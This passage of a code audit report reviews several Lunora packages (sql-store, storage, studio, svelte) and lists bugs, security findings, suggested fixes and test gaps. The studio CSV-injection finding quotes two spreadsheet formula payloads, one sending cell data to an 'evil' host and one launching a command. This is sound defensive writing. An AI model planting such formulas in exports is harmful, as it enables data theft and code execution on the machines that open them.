- Auth gate components Authenticated/AuthLoading/Unauthenticated are entirely untested (create-auth.test.tsx only covers token/user/setToken), including the token-set-but-getCurrentUser-rejects state where AuthLoading currently wedges.
- createSubscription's onError path (server-pushed subscription error sets error() and clears data()) has no test; **tests**/fake-client.ts's subscribe stub doesn't even accept the onError option, so the channel can't be exercised.
- createFlag context reactivity: re-subscribe + reset-to-default when the context accessor changes is untested (only a reactive key change is covered); createFlags' context-change reset is also untested.
- createPresence setData(): the immediate heartbeat carrying the replaced awareness data, and the visibilitychange re-heartbeat listener, are untested.
- createMutation overlapping invocations: no test issues two concurrent mutate() calls and asserts data()/error() ordering (would document the out-of-order clobber race) — only ref-counted pending is covered, and that on createMutator.
- createRateLimit: only 'token bucket' configs are tested — fixed-window/sliding-window kinds and interval teardown via onCleanup while still throttled are unexercised.
- shardKey forwarding from createQuery/createPaginatedQuery/hydratePreloaded options into client.subscribe is asserted nowhere despite fake-client recording it.

<a id="lunorasql-store"></a>

### @lunora/sql-store

**Assessment:** The core is carefully engineered — all values are bound parameters, identifiers go through drizzle quoting, the by-id IDOR guard and client-id validation are solid, and the dialect seam is well documented — but the rank-companion maintenance diverges from its @lunora/do twin in ways that make restore() crash with a raw PK violation and let patched soft-deleted rows leak back into rank results, and the indexed groupBy fast path silently returns wrong groups for partially-filtered requests. Test coverage is thin relative to the surface: 361 test lines against a 3,492-line ctx-db leave soft delete, aggregate/rank companion maintenance, triggers, CDC, cascades, and search entirely unexercised.

#### 1. [HIGH / bug] restore() double-inserts the rank companion row and throws a raw PK violation — **verified: confirmed**

`packages/sql-store/src/ctx-db.ts:3098`

restore() calls writer.patch(id, {softField: null}) and then forces syncRanks(tableName, id, undefined, row) to "re-add" the rank entry (lines 3088-3099). But unlike the DO twin (packages/do/src/ctx-db-companions.ts:72 has a rankIndexFieldsUnchanged fast path that skips the sync), this package's syncRanks (lines 2000-2057) ALWAYS runs DELETE+INSERT on patch — so the patch already re-inserted the rank row. The forced second syncRanks call has previous=undefined (no DELETE) and INSERTs again, violating the companion's `__id__ ... PRIMARY KEY` (line 1214). The error comes from raw queryRun (no isUniqueViolation remap in syncRanks), so restore() on any soft-delete table with a materialized rankIndex throws a raw engine UNIQUE-constraint error. The comment at 3090-3093 ("patch's rank sync skips re-adding it (sort fields unchanged)") describes the DO implementation, not this one.

**Suggested fix:** Port the DO twin's rankIndexFieldsUnchanged fast path into syncRanks (export it from @lunora/do or replicate it), which makes the restore() forced re-add correct again — or drop the forced syncRanks call in restore() since patch's sync already re-adds the entry.

**Verifier note:** Confirmed by full static trace. Soft delete removes the rank-companion row (ctx-db.ts:2592, syncRanks(existing, undefined)). restore() (3067-3101) then calls writer.patch(id, {softField: null}); patch unconditionally runs syncRanks(existing, merged) (3058), and this package's syncRanks (2000-2057) — unlike the DO twin's (packages/do/src/ctx-db-companions.ts:51-74, rankIndexFieldsUnchanged fast path) — always does DELETE+INSERT, so the patch already re-inserts the rank row. restore()'s forced syncRanks(undefined, row) (3098) skips the DELETE and runs a second plain INSERT into a table whose **id** is PRIMARY KEY (DDL line 1214), producing a raw engine UNIQUE violation via queryRun (the isUniqueViolation→ConflictError remap exists only in runWrite/runGuardedWrite at 2144/2222, not in syncRanks). The comment at 3090-3093 indeed describes the DO implementation. No refutation held: decodeRow does not filter soft-deleted rows; companion tables are auto-created in production by ensureMigrated (1470); restore is publicly reachable via ctx.db.<table>.restore (server/facade.ts:322-327) on any .global()+.softDelete()+.rankIndex() table; no test pins this path (d1 soft-delete suite has no rankIndexes and calls raw patch, not restore). Only escapes are a static rank `where` the row fails or a no-op restore. Severity kept at high with a caveat: it is a deterministic crash of a public API operation on a documented feature combination, though the underlying data ends up correct (the patch commits and the companion row patch inserted is right) and a retry succeeds via the wasDeleted=false path — so it is broken UX/error surface rather than data corruption; if the audit weighs self-healing behavior heavily, medium would also be defensible.

#### 2. [HIGH / bug] Indexed groupBy ignores a partially-constraining where and returns filtered-out groups — **verified: confirmed**

`packages/sql-store/src/ctx-db.ts:2295`

tryIndexedGroupBy: when the request's where pins only a strict subset of the index's by-tuple (partialKeys.length > 0 but < by.length — reachable, since @lunora/do's collectPartialKey accepts any eq-subset of by), the code falls into the "open group key" branch (lines 2294-2308) which enumerates EVERY companion row and returns them all, silently discarding the where filter. Example: aggregateIndex by:["tenant","status"] materialized; groupBy("t", { by: ["tenant","status"], where: { tenant: "a" } }) returns groups for every tenant, whereas the SQL GROUP BY scan fallback (and a table without the companion) correctly returns only tenant "a" groups. Indexed and scan paths disagree; the wrong answer appears only once the companion is materialized, which makes it a nasty production-only divergence. The DO twin has the same hole but at least labels it "partially-filtered, future work"; here it is silent.

**Suggested fix:** In the open-key branch, filter the enumerated rows in JS against planned.partial (compare the JSON.parse(**key**) tuple to the partial's entries), or return undefined (fall back to the SQL scan) whenever partialKeys.length > 0 but not full.

**Verifier note:** Confirmed end-to-end. (1) Reachable: ctx.db.<table>.groupBy({ by, where }) is public (packages/server/src/data-model.ts:246, facade.ts:279); RLS middleware only adds baseWhere, and with no read policy the fast-path gate at sql-store/src/ctx-db.ts:2871 passes with the user's where intact. (2) Planner accepts the partial: selectIndexForGroupBy requires by to exactly match, then collectPartialKey (packages/do/src/aggregates.ts:265-277) accepts any eq-subset of by — so by:["tenant","status"] + where:{tenant:"a"} yields partial={tenant:"a"}. Its docstring even claims "we filter the companion by **key**", but that filtering is never implemented. (3) In tryIndexedGroupBy (sql-store ctx-db.ts:2277-2308), a strict-subset partial fails the fully-specified check (1 !== 2) and falls into the open branch, which SELECTs the entire companion table with no WHERE and never consults planned.partial; the caller returns it with no post-filter. (4) The SQL GROUP BY fallback compiles the where into SQL, so indexed vs scan genuinely disagree, and only after ensureBackfilled returns true — a production-only divergence exactly as claimed. (5) The DO twin (packages/do/src/ctx-db.ts:2698) has the same hole, labeled "partially-filtered, future work". (6) No test covers a partial eq-where on the indexed groupBy path (the one where+groupBy test uses a non-by key on an index-less schema; sql-store has no groupBy tests). Silent wrong results (filtered-out groups returned) on a public API, plus a cross-tenant aggregate-value leak for apps that scope via plain where rather than RLS, supports the claimed high severity.

#### 3. [MEDIUM / bug] Patching a soft-deleted row resurrects it in rank indexes

`packages/sql-store/src/ctx-db.ts:3058`

delete()'s soft path deliberately removes the row's rank companion entry (line 2592, syncRanks(existing, undefined)) so soft-deleted rows disappear from rank()/rankPage(). But patch() unconditionally calls syncRanks(tableName, id, existing, merged) (line 3058), and syncRanks does DELETE (no-op, entry absent) + INSERT for any next row — no soft-delete check (lines 2030-2055). So any patch of a soft-deleted row (an admin fix-up, a $onUpdateFn stamp, an onSetNull cascade writing into it) re-adds its rank entry, and the soft-deleted row then leaks back into rankPage()/rank() results — hydrateRankRows (line 887) applies no soft-delete filter either. The DO twin's fields-unchanged fast path avoids this for marker-preserving patches.

**Suggested fix:** In syncRanks, skip the INSERT when the next document has its table's softDeleteMode marker set (mirroring what delete()'s soft path establishes), and/or adopt the DO twin's rankIndexFieldsUnchanged skip.

#### 4. [MEDIUM / bug] NULL sort-key values break rank position counting and rankPage cursor pagination

`packages/sql-store/src/ctx-db.ts:848`

Optional sort fields bind NULL into the rank companion (lines 1960, 2047: `document[key.field] ?? null`). buildRankCursorSeek (line 848) emits `col > ?`/`col < ?` for the pivot comparison; when the decoded cursor value is NULL, `col > NULL` evaluates to NULL for every row, so the branch never matches — all rows ordered after a page boundary that lands on a NULL-valued row are silently dropped from subsequent pages. buildRankBeforeBranches (line 806) has the mirrored problem for rank(): rows whose sort column is NULL sort before a non-NULL own row (SQLite/MySQL ASC NULLs-first) but `col < ownValue` is NULL for them, so position is undercounted; and when own[column] is NULL only the id-tiebreak branch can match. Additionally the ORDER BY at line 3354 emits no NULLS FIRST/LAST, so Postgres (NULLs-last ASC) orders NULL rows differently from SQLite/MySQL, meaning the same cursor walks a different sequence per engine.

**Suggested fix:** Extend the seek/before builders with explicit NULL branches (e.g. for ASC: `col IS NOT NULL` when pivot value is NULL, prefix `col IS NULL AND ...` handling like buildSeekWhere would need) and emit engine-consistent NULLS FIRST/LAST in the rank ORDER BY; or document/enforce that rank sortBy fields must be non-optional (reject optional validators at schema build).

#### 5. [MEDIUM / refactor] SqlDialect.encode/decode are dead interface members that every dialect must still implement

`packages/sql-store/src/dialect.ts:76`

The store core never calls dialect.encode or dialect.decode — it hard-codes the shared SQLite codec (ctx-db.ts:287 `serializeColumnValue = sqliteEncode`; decodeGlobalRow uses sqliteDecode directly). Grep confirms no caller in @lunora/d1 or @lunora/hyperdrive either; both concrete dialects (hyperdrive/src/global-dialect.ts) implement them as pass-throughs to sqliteEncode/sqliteDecode. Worse, value-codec.ts:6-9 documents that "Postgres and MySQL dialects ... override encode/decode where the driver returns native values", which is false and invites a future dialect author to implement an override that will silently never run — a latent correctness trap, not just clutter.

**Suggested fix:** Either delete encode/decode from SqlDialect (and fix the value-codec.ts doc to say storage is SQLite-shaped on every engine), or actually route serializeColumnValue/decodeGlobalRow through the dialect so the seam is real.

#### 6. [LOW / bug] union/any decode corrupts string values that look like JSON

`packages/sql-store/src/value-codec.ts:100`

sqliteEncode stores a string union member verbatim, but sqliteDecode for kind "union"/"any" parses ANY stored string starting with '{' or '[' as JSON. So a field declared v.union(v.string(), v.object(...)) that stores the legitimate string value '{"a":1}' or '[1,2]' round-trips back as an object/array instead of the original string — silent data corruption for JSON-shaped string inputs (user-pasted JSON snippets are a realistic case). The ambiguity is inherent to sharing one TEXT column, but the failure is silent.

**Suggested fix:** Disambiguate at encode time for union/any columns (e.g. prefix-tag JSON-encoded non-scalars, or JSON-encode strings too so decode is uniform), or at minimum document the corruption case where the union storage scheme is defined.

#### 7. [LOW / perf] syncRanks issues DELETE+INSERT per rank index on every patch/replace even when nothing changed

`packages/sql-store/src/ctx-db.ts:2032`

Every patch/replace on a table with rank indexes pays 2 statements per index per write regardless of whether any partition/sort field changed (lines 2030-2055). The DO twin short-circuits via rankIndexFieldsUnchanged (packages/do/src/ctx-db-companions.ts:70-74). On D1, where each statement is a network round-trip and companion writes are the documented at-least-once seam, this doubles the crash window in which the companion can diverge from the row, in addition to the latency cost.

**Suggested fix:** Reuse the DO twin's unchanged-fields fast path (export rankIndexFieldsUnchanged from @lunora/do); this also fixes the restore() and soft-delete-resurrect findings above.

#### 8. [LOW / security] insert()/replace() trust a document-supplied _creationTime without the gate that protects _id

`packages/sql-store/src/ctx-db.ts:2957`

insert()'s docstring explains that a client-chosen _id is ignored unless allowExplicitId/clientId is set, "even if a handler forwards a raw client payload". But line 2957 honors `withDefaults["_creationTime"]` verbatim whenever it is a number, with no opt-in; replace() does the same at line 3437. A handler that forwards a raw payload (the exact threat the _id guard defends against) lets a client backdate/forward-date rows, reordering default listings, keyset cursors, and search tiebreaks, and stamping forged times into rank/aggregate companions and CDC post-images.

**Suggested fix:** Gate _creationTime behind the same allowExplicitId opt-in as _id (mint from clock() otherwise), matching the documented trust model.

#### Missing test coverage

- Soft delete: delete() soft path, idempotent re-delete, restore(), includeDeleted reads, and soft-delete scoping of search/aggregate/count have zero tests (a restore test on a rank-indexed soft-delete table would catch the PK-violation bug immediately).
- Aggregate companions: applyAggregateDelta for count/sum/avg/min/max (including the min/max recompute-on-extreme-removal branch and pruneEmptyGroup), ensureBackfilled rebuild from a populated table, and the indexed count()/aggregate()/groupBy() fast paths are untested — only the scan-path count() is exercised.
- groupBy(): no test at all, neither the SQL GROUP BY scan nor the indexed companion path (fully-specified vs open key, and the partially-filtered where case).
- Search: searchViaScan (reachable under node:sqlite), withSearchIndex builder guards (wrong field, missing .search(), non-filter .eq()), filter narrowing, and soft-delete hiding in search results are untested.
- Triggers: before/after insert/update/delete firing, the MAX_TRIGGER_DEPTH recursion guard, and the throwing scheduler stub have no coverage.
- CDC: recordCdc emission per op (including soft delete recording op:"update"), readSqlCdcChanges cursor/limit clamping, and trimSqlCdcChanges are untested.
- onDelete cascades: cascade/restrict/setNull holder handling, hard-vs-soft cascade propagation, and the shardBy cross-backend cascade error are untested.
- OCC: no test provokes an actual optimistic-concurrency ConflictError (row changed during a before-trigger await), nor the MySQL affected-rows==0 conflict path — only rendered SQL text is asserted for MySQL/Postgres.

<a id="lunorastorage"></a>

### @lunora/storage

**Assessment:** The package is well-structured and unusually well-tested for its size, with a strong grasp of R2's binding semantics, SigV4/HMAC signing, and path-traversal/IDOR concerns. The two substantive issues are a systematic misuse of the redacted INTERNAL error code for client-facing input validation, and a Proxy that surfaces sha256 fields invisibly to serialization — both undermine advertised behavior rather than break the core crypto/storage paths.

#### 1. [MEDIUM / bug] Input-validation failures thrown as INTERNAL — redacted 500 instead of 400/413

`packages/storage/src/create-storage.ts:187`

Every validation throw in the package uses new LunoraError("INTERNAL", ...): validateKey (empty/too-long/NUL/leading-slash/'..' — lines 187,191,195,199,208), the allowedContentTypes/contentType checks (251,255), the maxSize check (276), the list NUL-prefix check (336), scopeKey (227), resumeMultipartUpload uploadId (411), and buildSignedUrl's expiresInSeconds bounds (signed-url.ts:138,142). In @lunora/errors the INTERNAL code is `internal: true` (packages/errors/src/catalog.ts), so toErrorBody redacts the message to a generic string and maps it to HTTP 500. These are all caller/client errors: an upload with a disallowed content-type, an oversized body, or a traversal key returns `500 Internal error` with the helpful message stripped, instead of 400 BAD_REQUEST / VALIDATION_ERROR (or 413 PAYLOAD_TOO_LARGE for maxSize) with a usable message. Wrong status pollutes alerting/retry logic and hides the actual cause from clients. The catalog already exposes non-internal BAD_REQUEST(400)/VALIDATION_ERROR(400)/PAYLOAD_TOO_LARGE(413) codes.

**Suggested fix:** Use VALIDATION_ERROR/BAD_REQUEST for key/content-type/prefix/uploadId/expiry validation and PAYLOAD_TOO_LARGE for maxSize breaches; reserve INTERNAL for the genuine 'bucket binding missing/unsupported' invariants.

#### 2. [MEDIUM / bug] withSha256 Proxy makes sha256/sha256Base64 invisible to JSON.stringify/spread/Object.keys

`packages/storage/src/create-storage.ts:86`

withSha256 traps only `get` and `has` (lines 86-107); it defines no `ownKeys`/`getOwnPropertyDescriptor` trap. So the synthetic `sha256`/`sha256Base64` are NOT own enumerable properties of the proxy — they appear only via direct property access (obj.sha256). Any structural read drops them: JSON.stringify(object), {...object}, Object.keys/entries, structuredClone. download() and list() both return these proxies (lines 306, 345). The whole point of the fields is to be 'surfaced by download()/list()', and list results are routinely returned from a query and serialized to the client over the wire — where JSON.stringify silently omits sha256/sha256Base64. The feature therefore does not work through the most common consumption path. Existing tests only read `object?.sha256` directly, so the gap is uncaught.

**Suggested fix:** Add ownKeys + getOwnPropertyDescriptor traps to the Proxy that report sha256/sha256Base64 as enumerable, or project into a real plain object (as toMetadata already does) for the non-host-object case.

#### 3. [LOW / reuse] toHex duplicated verbatim between create-storage.ts and presigned-url.ts

`packages/storage/src/create-storage.ts:32`

The lowercase-hex encoder toHex (create-storage.ts:32-41) is byte-for-byte identical to presigned-url.ts:41-50. Two other tiny divergences live nearby: trimTrailingSlashes (create-storage.ts:166, strips all trailing slashes) is used by getUrl, but buildSignedUrl (signed-url.ts:155) trims only a single trailing slash, so a publicBaseUrl like 'https://cdn.test//' yields a clean getUrl but a double-slash signed URL. Low payoff but a concrete dedup: hoist toHex (and a shared base-trimmer) so getUrl and getSignedUrl agree on base normalization.

**Suggested fix:** Extract toHex and a base-URL trimmer into one internal helper module shared by create-storage/presigned-url/signed-url.

#### 4. [LOW / security] Stream maxSize enforcement is bypassed by non-byte stream chunks

`packages/storage/src/create-storage.ts:145`

enforceStreamMaxSize's byteLengthOf (lines 139-146) counts only ArrayBuffer and ArrayBuffer.isView chunks; any other chunk type (e.g. a ReadableStream that enqueues strings) returns 0 and is passed through uncounted, so `seen` never grows and the maxSize abort never fires. maxSize is documented as a security/quota control against unbounded uploads. Request bodies are byte streams so the common path is safe, but an app piping a string/object stream into store()/upload() with a maxSize cap gets no enforcement while believing it is protected.

**Suggested fix:** Reject (error the stream) on encountering a chunk whose byte length can't be determined, rather than passing it through uncounted.

#### Missing test coverage

- getMetadata()'s zero-length-ranged-GET fallback (bucket.get(key, {range:{length:0}})) is only tested against an in-memory fake; the workerd/Miniflare integration suite always has head(), so the real-R2 behavior of a length:0 range for a HEAD substitute is unverified.
- withSha256: no test asserts that sha256/sha256Base64 survive JSON.stringify / spread / Object.keys on download()/list() results — the exact path that fails today.
- enforceStreamMaxSize: no test feeds a ReadableStream of non-byte (string) chunks to confirm whether the maxSize cap holds; current stream test uses a byte stream only.
- buildSignedUrl with a publicBaseUrl carrying a trailing slash or double slash (base-normalization) is not exercised, and getUrl vs getSignedUrl base agreement is untested.
- list() with a NaN/Infinity limit from a JS caller: `limit ?? DEFAULT` keeps NaN (NaN is not nullish), and Math.min(Math.max(1,Math.floor(NaN)),1000)=NaN reaches R2 — no test covers a non-finite limit.
- buildPresignedUrl is exported from index but has no key-validation of its own; no test covers passing a '..' key directly to buildPresignedUrl (only the createStorage.getPresignedUrl wrapper's validateKey guard is tested).

<a id="lunorastudio"></a>

### @lunora/studio

**Assessment:** Healthy, carefully-written admin UI: masking fails closed, the mail preview is sandboxed with a CSP, error docsUrl links are scheme-filtered, router search params are validated at the boundary, and dev-host writes carry CSRF defenses. The real issues found are a CSV formula-injection gap in the grid export, an eq/ne numeric-coercion mismatch that silently returns zero rows for numeric-looking TEXT values (including facet clicks), and a handful of missing-cancellation races in the file browser and facet fetches, plus some helper duplication that the repo's own docs say should be centralized.

#### 1. [MEDIUM / bug] eq/ne filters coerce numeric-looking strings to numbers, silently matching zero rows on TEXT columns

`packages/studio/src/features/data/data-filters.tsx:33`

toFilterClauses coerces any non-`contains` filter value that parses as a number (`!Number.isNaN(Number(v))`) to a JS number — including for eq/ne. Server-side (packages/do/src/introspect.ts:898,924) the value is bound against `json_extract(__doc__, '$."col"')`, an expression with no type affinity, so SQLite never coerces: TEXT '123' = INTEGER 123 is false. Failure scenario: a TEXT column storing "00123", a zip code, or any numeric-looking string can never be matched with =; worse, clicking a facet value in the sidebar for such a column (use-data-browser.tsx facetFilter → facetValueText → string → re-coerced to number) produces a filter that shows 0 rows while the facet count says N. Also coerces surprising forms: Number("0x10")=16, Number("1e3")=1000, Number("Infinity")=Infinity.

**Suggested fix:** Only coerce for the ordering operators (gt/gte/lt/lte), or carry the original typed value from facet clicks instead of round-tripping through a string; alternatively have the server compare with both bindings (value OR CAST).

#### 2. [MEDIUM / bug] File-browser list() has no cancellation — out-of-order responses render the wrong prefix/bucket listing

`packages/studio/src/features/storage/hooks/use-file-browser.ts:239`

list() (lines 239-260) sets state from whichever response resolves last, with no cancel token or sequence check. Rapid navigation (type prefix → List, then click a folder; or selectBucket while a slow list is in flight) lets an older request resolve after the newer one and overwrite `objects`/`nextCursor` — the grid then shows rows from the previous prefix or bucket while `prefix`/`bucket` state points at the new one, deriveEntries slices names against the wrong prefix, and loadMore pages the stale cursor into the wrong scope. The same file's sibling hook use-run-sql.ts already implements the cancel-token pattern for exactly this reason. Relatedly, checkOrphans results are reset when referenceShard changes (line 526) but NOT when the bucket changes, so a dangling-reference report computed for bucket A stays on screen after switching to bucket B.

**Suggested fix:** Thread a cancellation token (or a monotonically-increasing request id compared before setState) through list()/checkOrphans, and clear dangling state in selectBucket.

#### 3. [MEDIUM / security] CSV export has no formula-injection (CSV injection) protection

`packages/studio/src/features/data/grid-features.tsx:38`

csvCell (line 38) and toCsv (line 57) write DB cell values verbatim into the exported CSV; only RFC-4180 quoting is applied. Table rows contain end-user application data, so a row value like `=WEBSERVICE("https://evil/"&A1)` or `=cmd|'/c calc'!A0` is exported unescaped. When the operator opens the export in Excel/LibreOffice/Sheets the formula executes — a classic data-exfiltration/RCE vector for admin-tool exports (CWE-1236). The JSON and SQL exports are safe; only CSV is affected.

**Suggested fix:** In csvCell, prefix values whose first character is =, +, -, @, tab, or CR with a single quote (or a leading tab), the standard OWASP CSV-injection mitigation, and force-quote them.

#### 4. [LOW / bug] Facet fetches race (last response wins) and toggleFacet fires a fetch inside a setState updater

`packages/studio/src/features/data/hooks/use-facets.tsx:69`

fetchFacet has no ordering/cancellation: refetchFacets fires on every filters/search/shard/table change (use-data-browser.tsx:461-471) while older fetches may still be in flight, so a slow response for a previous view can land after the current view's response and display stale value/count summaries that don't match the visible rows. Separately, toggleFacet calls fireAndForget(fetchFacet(...)) from inside the setFacets updater function (lines 74-77); React may invoke updaters more than once (StrictMode dev, render replays), producing duplicate facet requests — side effects in updaters are an explicit React anti-pattern.

**Suggested fix:** Move the fetch kick-off out of the updater (check `column in facetsRef.current` first), and stamp each fetch with a per-column sequence number ignored if superseded.

#### 5. [LOW / bug] usePersistedList clobbers the new key's stored value when `key` changes

`packages/studio/src/lib/browser-storage.ts:52`

The useState initializer reads storage once (mount), but the persist effect depends on [key, value]. If `key` ever changes across renders, the effect immediately writes the OLD key's in-memory value under the NEW key, destroying whatever was persisted there, and the state never reloads from the new key. Latent today (all current callers — sql-tabs, sql-editor-panel, dashboards-panel — pass constant keys) but this is an exported generic helper whose signature invites dynamic keys (e.g. a per-table key).

**Suggested fix:** Either document/assert that key must be constant, or reload state when key changes (useEffect that setValue(loadJsonArray(key)) keyed on key, skipping the first write).

#### 6. [LOW / reuse] saved-queries and shard-history reimplement browser-storage's guarded store()/load/persist helpers

`packages/studio/src/lib/saved-queries.ts:43`

lib/browser-storage.ts already provides the guarded store() accessor, loadJsonArray<T>() (identical JSON.parse + Array.isArray + catch shape) and saveJson(). saved-queries.ts:43-86 and shard-history.ts:13-59 each duplicate all three (store(), the parse-and-filter loader, the try/catch setItem), and token-storage.ts:10-17 duplicates the guard a fourth time (sessionStorage variant). Four copies of the same storage-guard logic in one package means a fix (e.g. handling a poisoned value) must be applied four times.

**Suggested fix:** Parameterize browser-storage's store() over localStorage/sessionStorage and have saved-queries/shard-history/token-storage consume loadJsonArray/saveJson instead of re-rolling them.

#### 7. [LOW / reuse] use-file-browser duplicates copyToClipboard despite lib/internal declaring itself the single home for it

`packages/studio/src/features/storage/hooks/use-file-browser.ts:140`

lib/internal.ts:145 defines copyToClipboard with a doc comment stating it is "the single home for the studio's copy buttons so the (browser-only) guard and its lint exception live in one place", and mail-panel/grid-features import it. use-file-browser.ts:140-148 defines a second, slightly different copy (async, no return signal, its own eslint-disable pair), violating that invariant — the two already diverge in error behavior (the local one lets a clipboard rejection propagate into onCopy's catch; the shared one swallows it).

**Suggested fix:** Replace the local helper with the lib/internal export (its boolean return also lets onCopy skip the Copied badge when no clipboard exists).

#### 8. [LOW / reuse] Try-it and function-runner duplicate the kind→client-method dispatch switch

`packages/studio/src/features/api/openapi/run-context.tsx:119`

run-context.tsx:119-133 and function-runner.tsx:195-209 contain the same switch (action → client.action, mutation → client.mutation, default → client.query) over the same FunctionKind vocabulary, each with its own status/error/duration bookkeeping around it. A future kind (or a change in how mutations should be dispatched from admin surfaces, e.g. bypassing the optimistic/offline queue) must be fixed in both places.

**Suggested fix:** Extract a shared dispatchByKind(client, kind, reference, args, options) helper in lib/internal next to adminRef/callOptions.

#### 9. [LOW / security] seed-data and policy-scaffold dev-host POSTs omit the X-Lunora-Studio CSRF header schema-edit sends

`packages/studio/src/lib/seed-data.ts:71`

schema-edit.ts:46 sends both Content-Type: application/json and the custom `X-Lunora-Studio: 1` header, explicitly documented as belonging to the `@lunora/config` csrfRejectionReason guard's defense-in-depth. seed-data.ts (line 71-75) and policy-scaffold.ts (lines 61-65) POST to the same guarded dev host with only Content-Type. The guard currently passes on Content-Type+Origin alone (packages/config/src/studio-host/serve-json-handler.ts:133), so nothing is broken today — but the studio's three clients of one endpoint family disagree on the contract, and if the host guard is ever tightened to require the marker header (as the schema-edit comment implies it may identify studio traffic), seed and policy-scaffold silently start 403ing.

**Suggested fix:** Add the X-Lunora-Studio header to seed-data.ts and policy-scaffold.ts (or extract one shared postToDevHost helper — see the reuse finding).

#### Missing test coverage

- lib/token-storage.ts has no test at all: loadToken/saveToken round-trip, clearing on empty string, and graceful degradation when sessionStorage access throws (sandboxed iframe/privacy mode) are unexercised.
- hooks/use-admin-query.ts — the studio's single data primitive — is untested: the live WS subscription pushing values into the TanStack cache, liveError being set on a rejected subscription and suppressed when live/enabled toggle off, the staleTime default split (Infinity for live vs 0), and the dev request-loop detector threshold.
- features/storage/hooks/use-file-browser.ts is untested (file-browser.test.tsx covers the panel markup only): the orphan-check truncation branch (exactly ORPHAN_LIVE_KEY_CAP keys must yield danglingTruncated=true with an EMPTY result rather than calling storageOrphans with a partial key set), bucket-switch selection/prefix reset, and upload key prefixing.
- features/api/openapi/run-context.tsx try-it dispatch has no test: the plain-REST fallback's read-body-once-then-parse behavior (non-JSON response degrades to text), the GET/HEAD no-body rule, and the kind-based query/mutation/action routing.
- No cross-package drift guard for lib/mask-preview.ts fnv1aHex against packages/server/src/mask/middleware.ts — the docs claim a byte-for-byte mirror and data-browser-mask.test.tsx only self-tests the client copy; a shared fixture (including a surrogate-pair/emoji input) would lock the parity the preview's correctness depends on.
- features/sql/hooks/use-run-sql.ts cancellation is untested: a stale in-flight result must be discarded when sql/shardKey changes or the component unmounts (the cancel-token behavior the hook exists to provide).
- lib/seed-data.ts and lib/policy-scaffold.ts response normalization is untested: non-OK with an unknown failure token falling back to the raw token, needsManualEdit routing, and the missing-rows/ok-mismatch branches.
- features/data/hooks/use-facets.tsx has no direct test: the toggle add/remove transitions, refetchFacets only re-running open facets, and (once fixed) ignoring out-of-order responses.

<a id="lunorasvelte"></a>

### @lunora/svelte

**Assessment:** @lunora/svelte is a thin, well-structured adapter that correctly delegates its hard parts (mutation/mutator runners, query-subscription lifecycle, pagination math) to the shared @lunora/client cores, and its lazy-readable teardown discipline is consistently applied with regression tests for past leak bugs; no security issues were found (it is a client-side store layer with no injection, auth, or secret-handling surface). The real weaknesses are concentrated in the hand-rolled paginated engine — which is missing the rebalance result-migration and stale-cache pruning that the Vue adapter already implements, causing visible items to blank out on SPLIT/JOIN — plus lifecycle footguns in presence (manual-only teardown, SSR heartbeat) and a feature-parity gap (query() lacks \"skip\").

#### 1. [MEDIUM / bug] Rebalance (SPLIT/JOIN) drops visible results — no result migration across re-keyed pages

`packages/svelte/src/paginated-query.ts:185`

When rebalance() returns a new page list, syncSubscriptions() closes the old key's subscription and rebuildPageResults() maps each new page to resultsByKey.get(newKey) — but nothing carries the old pages' results to the new keys. Failure scenario: items are deleted so a bounded page shrinks below JOIN_FACTOR (0.5×numItems, see packages/client/src/pagination/index.ts:106) → rebalance merges it with its neighbour → the merged page's key has no resultsByKey entry → rebuildPageResults emits undefined for that slot → the derived `results` store (line 325-329 skips undefined pages) silently drops BOTH merged pages' items from the UI until the new subscription's first server frame arrives. Same blank-flash on SPLIT. The Vue adapter fixed exactly this with migrateResultsForRebalance (packages/vue/src/use-paginated-core.ts:88-111, doc comment: "Carry existing results to the new keys so visible data is preserved"); Svelte (and Solid) never got the fix, even though loadMore's tail re-key at lines 265-279 does the analogous carry.

**Suggested fix:** Port Vue's migrateResultsForRebalance: after `const next = rebalance(...)`, for each new page whose key is missing from resultsByKey, seed it from the old page with the same `lower` bound before calling pagesStore.set(next)/syncSubscriptions()/rebuildPageResults().

#### 2. [LOW / bug] resultsByKey entries are never pruned when stale page subscriptions close

`packages/svelte/src/paginated-query.ts:146`

syncSubscriptions() closes stale subscriptions (lines 143-149) and deletes from activeSubs and pendingPageKeys, but never `resultsByKey.delete(key)` — Vue's equivalent does (packages/vue/src/use-paginated-core.ts:126 `resultsByKey.delete(entry.currentKey)`). Two consequences: (1) stale data resurrection — after loadMore pins the tail `{lower:X, upper:null}` → `{lower:X, upper:C}`, the old open-tail key keeps its cached result; if a later JOIN merges the pinned page with the new tail, the merged page's key is exactly the old open-tail key, so rebuildPageResults serves the outdated pre-loadMore result as live data until the fresh subscription responds; (2) the map grows unboundedly across loadMore/rebalance cycles in a long-lived feed (chat, infinite scroll), retaining every superseded page array.

**Suggested fix:** Delete the resultsByKey entry alongside activeSubs.delete(key) in the stale-subscription sweep, and delete the old tail key after the loadMore carry at lines 268-279.

#### 3. [LOW / bug] presence() starts heartbeats/interval/connection-context eagerly with manual-only teardown; also fires a heartbeat mutation during SSR

`packages/svelte/src/presence.ts:98`

createPresenceHandle sends a heartbeat and starts setInterval at call time (lines 98-99) and registers acquireConnectionContext (line 115), all torn down only by an explicit handle.teardown(). Unlike Vue (onScopeDispose, use-presence.ts:130) and Solid (everything deferred into onMount + onCleanup, create-presence.ts:99-134), nothing ties disposal to component destruction — a consumer who forgets `onDestroy(handle.teardown)` leaks the interval, keeps sending heartbeat mutations for the page lifetime, and keeps the user falsely "present" after unmount. Additionally, because the first heartbeat is not deferred to mount (Solid defers it precisely for this), calling presence() in a SvelteKit component's init during SSR fires a server-side heartbeat mutation with a fresh random sessionId per render (makeSessionId, line 60), creating phantom presence rows that linger until the server TTL expires.

**Suggested fix:** Wire auto-teardown via svelte's onDestroy (safe: it runs during component init and on SSR) with a try/catch fallback for out-of-component use, and gate the initial heartbeat/interval behind a browser check (typeof document !== "undefined") like the visibility listener already is.

#### 4. [LOW / refactor] query() lacks the "skip" sentinel every other adapter's query hook supports

`packages/svelte/src/query.ts:41`

The docblock sells query() as "the Svelte equivalent of React's useQuery", but React's useQuery takes `args: ArgsOf<F> | "skip"` (packages/react/src/use-query.ts:23), and Vue/Solid accept it too; the shared createQuerySubscription already implements the SKIP branch (packages/client/src/query/query-subscription.ts:78-82, including the onReset sink). Svelte's own subscription() and paginatedQuery() accept "skip", so query() is the one live-read primitive where a conditional query (e.g. gated on auth or a route param) is impossible — users must fall back to subscription() and lose the simpler single-store shape.

**Suggested fix:** Widen args to `ArgsOf<F> | "skip"` and pass it straight through — createQuerySubscription already handles the sentinel; add onReset: () => set(undefined) for parity with Vue.

